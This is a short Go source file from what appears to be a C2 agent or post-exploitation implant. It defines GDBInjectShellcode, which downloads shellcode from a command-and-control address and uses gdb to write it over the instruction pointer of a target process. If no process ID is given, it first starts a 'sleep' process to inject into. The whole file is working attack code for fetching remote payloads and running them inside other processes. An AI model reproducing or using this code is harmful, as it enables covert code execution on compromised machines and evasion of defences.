package agent

import (
	"fmt"
	"io/ioutil"
	"os/exec"
	"strconv"
	"strings"
)

// GDBInjectShellcode inject shellcode to a running process using GDB
// start a `sleep` process and inject to it if pid == 0
// gdb command: set (char[length])*(int*)$rip = { 0xcc }
func GDBInjectShellcode(pid int) error {
	if pid == 0 {
		cmd := exec.Command("sleep", "10")
		err := cmd.Start()
		if err != nil {
			return err
		}
		pid = cmd.Process.Pid
	}
	shellcodeFile := AgentRoot + "/shellcode.txt"
	err := DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
	if err != nil {
		return err
	}
	shellcode, err := ioutil.ReadFile(shellcodeFile)
	if err != nil {
		return err
	}
	shellcodeLen := strings.Count(string(shellcode), "0x")

	out, err := exec.Command(UtilsPath+"/gdb", "-q", "-ex", fmt.Sprintf("set (char[%d]*(int*)$rip={%s})", shellcodeLen, shellcode), "-ex", "c", "-ex", "q", "-p", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("GDB failed (shellcode length %d): %s\n%v", shellcodeLen, out, err)
	}

	return nil
}
